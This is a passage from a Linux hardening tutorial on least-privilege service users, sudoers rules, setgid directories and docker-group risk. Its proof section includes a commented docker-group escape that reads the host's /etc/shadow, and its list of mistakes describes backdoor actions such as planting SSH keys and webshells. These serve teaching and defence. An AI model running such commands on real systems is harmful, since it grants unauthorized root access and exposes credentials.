          (never plain-edit sudoers)        └─ run one command as another user

deploy ALL=(root) NOPASSWD: /usr/bin/systemctl restart myapp
│      │   │      │         └─ the ONE exact command allowed (path + args)
│      │   │      └─ don't ask for a password
│      │   └─ may run as root
│      └─ on all hosts
└─ the user this rule governs
```

---

## Example 1 — Basic: prove the app can't touch its own code

```bash
# Set up a tiny version of the pattern
sudo groupadd webapps
sudo useradd --system --shell /usr/sbin/nologin --no-create-home nodeapp
sudo usermod -aG webapps nodeapp
sudo mkdir -p /srv/demo
echo "console.log('hi')" | sudo tee /srv/demo/server.js >/dev/null

# Code owned by root:webapps, app can READ (group r-x) but NOT write
sudo chown -R root:webapps /srv/demo
sudo chmod -R 750 /srv/demo

# Prove the app can read its code:
sudo -u nodeapp cat /srv/demo/server.js       # → console.log('hi')   ✓ reads

# Prove the app CANNOT overwrite its code (the whole point):
sudo -u nodeapp sh -c 'echo evil > /srv/demo/server.js'
# sh: cannot create /srv/demo/server.js: Permission denied   ✓ RCE-safe

# Prove nologin blocks a shell:
sudo su - nodeapp
# This account is currently not available.                    ✓ no shell
```

---

## Example 2 — Production Scenario

**Situation:** It's 2am. You're paged: the Node API is up (health check passes) but every **file upload** returns `500`. You SSH in as `alice`. The last deploy was 20 minutes ago, run by CI, not by you. Manual deploys never had this problem.

```bash
# The app is running — as whom?
ps -o user,pid,cmd -C node
# USER      PID  CMD
# nodeapp  4127  /usr/bin/node /srv/app/dist/server.js        ← good, runs as nodeapp

# What's the actual error? (topic 22/23 — journald)
journalctl -u myapp --since "30 min ago" | grep -i upload
# Error: EACCES: permission denied, open '/srv/app/uploads/9f3a.tmp'
#                       ▲── the app can't WRITE its own upload dir

# Look at the upload dir ownership:
ls -ld /srv/app/uploads
# drwxr-x--- 2 deploy deploy 4096 Jul 12 01:40 /srv/app/uploads
#              ▲───── ▲──── owned deploy:DEPLOY, mode 750 → nodeapp gets 'other' = ---

# THERE it is. CI recreated uploads/ during deploy. Because /srv/app did NOT have
# setgid set, the new dir got deploy's PRIMARY group (deploy), not webapps — and
# nodeapp is not in the deploy group, so it fell through to 'other' (---). EACCES.

# Fix the immediate breakage:
sudo chown nodeapp:webapps /srv/app/uploads
sudo chmod 770 /srv/app/uploads
sudo -u nodeapp sh -c 'touch /srv/app/uploads/probe && rm /srv/app/uploads/probe' \
  && echo "app can write uploads now"        # → app can write uploads now

# Fix the ROOT CAUSE so the next CI deploy doesn't reintroduce it:
sudo chmod g+s /srv/app                       # setgid → new dirs inherit webapps
sudo chgrp -R webapps /srv/app
sudo find /srv/app -type d -exec chmod g+s {} +

# Verify: a file deploy creates now inherits webapps
sudo -u deploy touch /srv/app/uploads/proof && ls -l /srv/app/uploads/proof
# -rw-r----- 1 deploy webapps 0 ... proof     ← group is webapps ✓  (was the drift)
```

**What you diagnosed:** the classic "works when I deploy by hand but breaks from CI" permission drift. Manual deploys inherited *your* groups; CI ran as `deploy` whose primary group is `deploy`, and the missing setgid bit let new files escape the shared `webapps` group. The fix is setgid (step 5) — exactly the topic 05 setgid-on-a-directory mechanism.

---

## Common Mistakes

### Mistake 1 — Running the app as root "because it was easier"

**Wrong:** `ExecStart=/usr/bin/node ...` with `User=root` (or no `User=` at all — systemd system units default to root).
**Right:** `User=nodeapp`, an unprivileged `--system` nologin account.

**Root cause:** with `User=root`, the app process has uid 0. The kernel's permission checks (topic 05) are *bypassed* for uid 0 — so any RCE reads every file, writes anywhere, and can `execve` anything. There is no containment.
**Broken state:** an RCE reads `/etc/shadow`, drops an SSH key in `/root/.ssh/authorized_keys`, adds a cron backdoor.
**Fix:** create the nologin user, `chown` the code away from it, set `User=`/`Group=` in the unit.
**Prevention:** the hardening checklist; treat `User=root` in a service unit as a code-review blocker.

### Mistake 2 — The app owns its own code

**Wrong:** `chown -R nodeapp:nodeapp /srv/app`.
**Right:** `chown -R deploy:webapps /srv/app`; only uploads/tmp owned by nodeapp.

**Root cause:** if the app's uid owns its source files, `write()`/`open(O_WRONLY)` on them *succeeds* — the kernel sees owner match and grants it.
**Broken state:** an RCE runs `fs.writeFileSync('/srv/app/dist/server.js', webshell)` — persistent backdoor that survives restart and looks like your app.
**Fix:** deploy owns code; app reads via the webapps group; `chmod 750`.
**Prevention:** `# PROVE IT` that `sudo -u nodeapp` cannot write into `dist/`.

### Mistake 3 — `NOPASSWD: ALL` in sudoers

**Wrong:** `deploy ALL=(ALL) NOPASSWD: ALL`.
**Right:** list the exact commands: `deploy ALL=(root) NOPASSWD: /usr/bin/systemctl restart myapp`.

**Root cause:** `ALL` in the command field means *every* command as root, no password. The deploy identity is now functionally root.
**Broken state:** deploy's stolen SSH key = full root; the "unprivileged deploy user" was theater.
**Fix:** enumerate the two or three commands CI needs; drop everything else.
**Prevention:** audit with `sudo -l` as deploy; block `NOPASSWD: ALL` in review.

### Mistake 4 — Hand-editing /etc/sudoers and saving a typo

**Wrong:** `nano /etc/sudoers`, save, log out.
**Right:** `visudo` (or `visudo -f /etc/sudoers.d/deploy`), which syntax-checks before saving.

**Root cause:** sudo refuses to run if its config won't parse. A stray character breaks *all* sudo.
**Broken state:** `sudo: parse error near line 42` for everyone; combined with disabled root SSH = locked out.
**Fix (if not yet logged out):** you still have your current shell — `visudo` will refuse the bad save and let you correct it. If already locked out: cloud rescue instance / single-user boot to repair the file.
**Prevention:** never open sudoers without visudo; keep a *second* root session open when changing sudo/SSH so a mistake is recoverable.

### Mistake 5 — Adding the deploy user to the `docker` group

**Wrong:** `usermod -aG docker deploy` "so CI can build images."
**Right:** understand this grants passwordless root; use rootless/Podman, or a tightly-scoped build step, or accept and firewall the risk deliberately.

**Root cause:** the Docker daemon is root; group membership = ability to command it; `docker run -v /:/host` escapes to the host.
**Broken state:** a compromised deploy key silently owns the host, bypassing every sudoers restriction you carefully wrote.
**Fix:** remove from `docker` group; move image builds to rootless Podman or an isolated CI runner.
**Prevention:** audit `getent group docker`; treat docker-group membership as equivalent to a root grant in your threat model.

---

## Hands-On Proof

```bash
# PROVE IT: nodeapp is a system account with nologin and no password
getent passwd nodeapp                         # uid < 1000, shell /usr/sbin/nologin
sudo getent shadow nodeapp                     # field 2 is '!' or '*' → no password

# PROVE IT: the kernel runs the app under nodeapp's uid
cat /proc/$(pgrep -f 'node .*server.js'|head -1)/status | grep -E 'Uid|Groups'

# PROVE IT: setgid on a directory forces group inheritance
sudo -u deploy touch /srv/app/dist/z && ls -l /srv/app/dist/z   # group = webapps

# PROVE IT: the app can read but not write its secrets
sudo -u nodeapp cat /etc/myapp/env >/dev/null && echo "read OK"
sudo -u nodeapp sh -c 'echo x >> /etc/myapp/env'    # → Permission denied

# PROVE IT: exactly what deploy can sudo
sudo -u deploy -H sudo -l                      # lists only the whitelisted commands

# PROVE IT: sudo writes an audit trail
grep sudo /var/log/auth.log | tail -3

# PROVE IT: the docker group is root-equivalent (DO ON A THROWAWAY VM ONLY)
# docker run --rm -v /:/host alpine cat /host/etc/shadow | head -1

# PROVE IT: adm group members can read logs without sudo
ls -l /var/log/syslog                          # group 'adm', mode 640
```

---

## Practice Exercises

### Exercise 1 — Easy

In the terminal: create a system user `svc` with `useradd --system --shell /usr/sbin/nologin --no-create-home svc`. Then prove three things with commands only: (a) its uid is below 1000 (`getent passwd svc`), (b) `su - svc` gives no shell, (c) it has no password (`sudo getent shadow svc`). Paste the output.

### Exercise 2 — Medium

Create `/srv/lab` owned `root:webapps`, mode `750`, and put `nodeapp` in `webapps`. Turn on setgid (`chmod g+s /srv/lab`). Now: as `nodeapp` prove you can READ a file in it but not WRITE one; then as root create a subdir and show (via `ls -l`) that the subdir inherited the `webapps` group. Explain in one line why the group was inherited.

### Exercise 3 — Hard (Production Simulation)

You inherit an over-permissioned legacy box: the Node app runs as root, owns `/opt/app` (its own code), the deploy user has `NOPASSWD: ALL`, and `deploy` is in the `docker` group. Using the terminal, produce a remediation you can execute: (1) create a `nodeapp` nologin system user and a `webapps` group; (2) re-own `/opt/app` to `deploy:webapps` 750 + setgid, with an `uploads/` owned by nodeapp 770; (3) write a `/etc/sudoers.d/deploy` (via `visudo -c -f`) that grants ONLY `systemctl restart app` and `systemctl reload nginx`; (4) remove deploy from the docker group; (5) change the systemd unit to `User=nodeapp`. For each step, run a `# PROVE IT` command showing the fix took effect. Paste the transcript.

---

## Mental Model Checkpoint

1. In one sentence: why does running your Node app as an unprivileged user turn a catastrophic RCE into a survivable one?
2. Why should the app user NOT own its own source code — what specific attack does that prevent, and which kernel check makes it work?
3. What does the setgid bit on a *directory* do, and which "works manually, breaks in CI" bug does it fix?
4. Why is `NOPASSWD: ALL` no better than running the app as root, and what should the rule look like instead?
5. Name three commands that, if allowed via a "restricted" sudo rule, actually give a full root shell — and say how each escapes.
6. Why must a script you allow via sudo be root-owned and not writable by the sudoer?
7. Why is adding a user to the `docker` group equivalent to giving them root, and what's the one-line exploit?

---

## Quick Reference Card

| Command | What It Does | Key Flags |
|---|---|---|
| `useradd` | Create a user account | `--system` (uid<1000), `--shell /usr/sbin/nologin`, `--no-create-home`, `-aG` no |
| `usermod` | Modify a user | `-aG group` (add to supplementary group), `-s shell` |
| `groupadd` | Create a group | `--system` |
| `passwd -l` | Lock a password (SSH-key-only login) | `-l` lock, `-u` unlock |
| `chown` | Change owner/group | `-R` recursive, `user:group` |
| `chmod` | Change mode bits | `750`, `640`, `g+s` (setgid), `-R` |
| `visudo` | Safely edit sudoers (syntax-checks!) | `-f FILE` (drop-in), `-c` (check only) |
| `sudo` | Run as another user | `-l` (list my rules), `-u USER`, `-H`, `-i` (root login shell) |
| `su -` | Switch user with login shell | needs target's password |
| `sudo -l` | Show what I can sudo | run as the deploy user to audit CI |
| `getent` | Query passwd/group/shadow | `getent passwd USER`, `getent group docker` |
| `id` | Show uid/gid/groups | `id USER`, `id -u`, `id -g` |

---

## When Would I Use This at Work?

### Scenario 1: Standing up a fresh box for a Node app
New VM. Before you deploy anything: create `nodeapp` (nologin system user), `deploy` (SSH-key CI user), the `webapps` group, the `/srv/app` layout owned `deploy:webapps` 750+setgid with `uploads/` owned by the app, `/etc/myapp/env` at 640 `root:nodeapp`, and a `/etc/sudoers.d/deploy` drop-in (via visudo) with the two exact commands CI needs. Twenty minutes that make an eventual RCE a non-event.

### Scenario 2: "CI deploy succeeds but the app 500s on upload"
Health check passes, uploads fail with EACCES. You check `ls -ld /srv/app/uploads`, find it owned `deploy:deploy` from the last CI run, realize the shared dir was missing setgid so new dirs escaped the `webapps` group, fix the ownership, and set `chmod g+s /srv/app` so it never drifts again.

### Scenario 3: Locking down an over-permissioned legacy box
Audit finds the app running as root, `NOPASSWD: ALL`, and deploy in the docker group. You migrate the app to a nologin user, re-own the code away from it, replace the blanket sudo rule with an exact-command drop-in, pull deploy out of the docker group (moving builds to rootless Podman), and verify each change with a `# PROVE IT`. The box goes from "one bug = game over" to defensible.

---

## Connected Topics

| Direction | Topic | Why |
|---|---|---|
| **Builds on** | 05 — File Permissions | rwx/octal, umask, and setgid-on-directories are the mechanism behind the whole layout |
| **Builds on** | 06 — Users and Groups | /etc/passwd, nologin shells, supplementary groups, uid checks are the identity model |
| **Builds on** | 22 — systemd | `User=`/`Group=`/`EnvironmentFile=` are how the app actually runs as the unprivileged user |
| **Builds on** | 24 — SSH | The deploy user's key-only login and authorized_keys |
| **Next** | 33 — Node in Production | Now that the user & permissions exist, run the app durably under systemd with graceful shutdown |
| **Used by** | 35 — Security Basics | auth.log auditing, disabling root SSH, and the hardening checklist extend this topic |
```
